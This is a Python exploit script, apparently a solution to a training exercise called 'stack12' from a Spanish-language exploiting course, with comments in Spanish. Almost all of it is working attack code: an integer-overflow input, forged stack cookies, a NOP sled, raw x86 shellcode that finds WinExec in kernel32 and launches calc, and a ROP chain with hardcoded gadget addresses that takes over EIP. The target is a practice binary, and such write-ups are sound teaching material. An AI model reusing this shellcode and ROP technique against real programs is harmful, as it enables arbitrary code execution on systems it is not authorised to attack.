#Solucion reto stack12 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/015%20stack12.idb/
import os
import struct

inputNum = "\x80" #Integer Overflow #=> este valor se utiliza luego para colocar en 0x40 el flProtect (se divide por 2)
cookie2 = struct.pack("<I", 0x45464748)
cookie1 = struct.pack("<I", 0x25262728)
cookie3 = struct.pack("<I", 0x00000048) #Size of buffer

#Shellcode
#MOV ESI, 10102000 #Puntero a VirtualAlloc
#MOV ESI, [ESI]    #Direccion de kernel32.VirtualAlloc
#SUB ESI,7B71A9F   #Resto a kernel32.VirtualAlloc para caer en el BaseImage de Kernel32
#ADD ESI,7C17D8F   #Sumo a Base Image la distancia de kernel32.WinExec
#PUSH 63616C63     #Pusheo al stack calc
#POP  EAX		   #Coloco calc en EAX
#PUSH 10103100     #Direccion escribible en idata seguida de ceros
#POP  ECX		   #Coloco en ECX 10103020
#MOV [ECX], EAX    #Copio calc en donde apunta 10103020
#PUSH ECX		   #Coloco ECX en el stack para susarlo como parametro de WinExec
#CALL ESI 		   #Llamo a WinExec
#RETN			   #Ret end

nopsleed = "\x90"*5
shellcode = "\xBE\x00\x20\x10\x10\x8B\x36\x81\xEE\x9F\x1A\xB7\x07\x81\xC6\x8F\x7D\xC1\x07\x68\x63\x61\x6C\x63\x58\x68\x00\x31\x10\x10\x59\x89\x01\x51\xFF\xD6\xC3"
buf = "\x90"*10
s = "BBBB"
rop =  struct.pack("<I", 0x10101096) #pop esi, pop ebp
rop1 = struct.pack("<I", 0x10103020) #puntero a direccion de mi shellcode (ppShelcode)
rop2 = "BBBB" #basura parar pop ebp
#mov  esi, [esi] me da la direccion real a mi shellcode
#call esi, salta a mi shellcode
rop3 = struct.pack("<I", 0x10101448) #  mov  esi, [esi]; mov ecx, esi; call j____guard_check_icall_fptr; call esi
#TODO: usar el gadget jmp [esi-74] y no harcodear la direccion del stack o sobre escribir el pVirtualAlloc con algun rop y mov de 10103020
r = rop+rop1+rop2+rop3 # => Controlo EIP (Puntero a mi shellcode en el stack)


payload = inputNum+cookie2+cookie1+cookie3+nopsleed+shellcode+buf+s+r

f = open("fichero.dat", "w")
f.write(payload)
f.close()

os.system("stack12.exe")